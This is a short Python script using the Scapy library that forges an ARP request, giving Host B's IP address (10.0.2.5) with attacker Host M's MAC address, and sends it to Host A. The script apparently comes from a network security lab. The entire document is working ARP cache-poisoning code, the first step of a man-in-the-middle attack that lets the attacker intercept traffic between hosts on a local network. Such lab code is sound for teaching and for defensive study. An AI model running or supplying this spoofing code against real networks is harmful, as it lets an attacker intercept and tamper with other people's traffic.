from scapy.all import *

# Create Ethernet frame, dst is Host A MAC, src is Host M MAC
E =  Ether(dst='08:00:27:D0:EB:83', src='08:00:27:8D:CF:4E')

# Create ARP request where:

# opcode: 1, ARP request
# hwsrc:  MAC of Host M
# psrc:   IP of Host B
# hwdst:  MAC of Host A
# pdst:   IP of Host A
A = ARP(op=1, hwsrc='08:00:27:8D:CF:4E', psrc='10.0.2.5', hwdst='08:00:27:D0:EB:83', pdst='10.0.2.4')

# Create packet
pkt = E/A

# Show packet
pkt.show()

# Send packet
sendp(pkt)